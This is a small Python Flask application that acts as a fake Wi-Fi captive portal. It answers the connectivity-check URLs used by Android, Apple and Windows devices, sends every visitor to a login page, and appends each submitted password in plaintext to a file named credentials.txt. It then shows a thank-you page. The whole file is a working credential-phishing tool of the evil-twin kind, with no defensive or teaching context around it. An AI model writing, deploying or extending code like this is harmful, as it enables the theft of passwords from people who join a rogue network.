from flask import Flask, request, render_template, redirect, send_from_directory

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        password = request.form.get('password')
        with open("credentials.txt", "a") as f:
            f.write(password + "\n")
        return redirect("/thankyou")
    return render_template('index.html')

@app.route('/thankyou')
def thankyou():
    return render_template('thankyou.html')

# ✅ Captive portal detection from various OS
@app.route('/generate_204')
@app.route('/hotspot-detect.html')
@app.route('/ncsi.txt')
@app.route('/redirect')
@app.route('/check_network_status.txt')
def trigger_captive_portal():
    return redirect("/")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)